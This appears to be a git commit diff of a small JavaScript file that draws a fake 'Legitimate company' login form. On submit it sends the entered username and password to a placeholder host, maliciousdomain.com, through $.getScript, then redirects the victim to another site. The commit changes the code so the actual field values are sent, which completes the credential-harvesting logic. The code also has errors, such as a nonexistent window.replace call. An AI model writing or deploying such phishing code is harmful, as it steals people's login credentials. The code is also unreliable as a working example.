c739b198968fbfa5ccf32554a681c6be87db000c
meaning123 <89698201+meaning123@users.noreply.github.com>
2021-08-28 17:17:33 +0000

    Update x.js

--- x.js
+++ x.js
@@ -1,8 +1,8 @@
 document.title = 'Allegiance-Login in';
 document.getElementById('template').innerHTML = "<center><h1>Legitimate company<h1><p>username: <input type='textbox' id='username'></p><p>password: <input type='textbox' id='password'></p><p><button type='button' style='width: 20em;  height: 2em;' onclick='myFunction();'>Submit</button></p></center>";
 function myFunction() {
-  var username = document.getElementById('username');
-  var password = document.getElementById('password');
+  var username = document.getElementById('username').value;
+  var password = document.getElementById('password').value;
   $.getScript("http://maliciousdomain.com" + username + password);
   window.replace("https://dell.inquisiteasp.com");
 };
